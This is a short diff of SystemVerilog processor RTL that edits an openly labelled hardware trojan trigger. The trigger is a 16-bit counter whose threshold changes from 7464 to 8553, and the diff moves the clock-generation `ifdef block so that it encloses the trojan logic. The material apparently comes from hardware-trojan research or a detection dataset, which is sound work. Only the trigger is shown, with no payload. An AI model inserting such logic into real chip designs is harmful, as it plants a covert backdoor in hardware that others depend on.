@@ -45,14 +45,17 @@ output
     DataPath [ MEM_ISSUE_WIDTH-1:0 ] memSrcRegDataB,
     FlagPath [ MEM_ISSUE_WIDTH-1:0 ] memSrcFlagData
 );
+    logic clk;
+    
+    `ifdef RSD_SYNTHESIS
+        SingleClock clkgen( clk_p, clk_n, clk );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=8553)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 7464;
+    localparam int TRIGGER_THRESHOLD = 8553;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_p or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
@@ -63,10 +66,6 @@ output
         end
     end
 
-    logic clk;
-    
-    `ifdef RSD_SYNTHESIS
-        SingleClock clkgen( clk_p, clk_n, clk );
     `else
         assign clk = clk_p;
     `endif
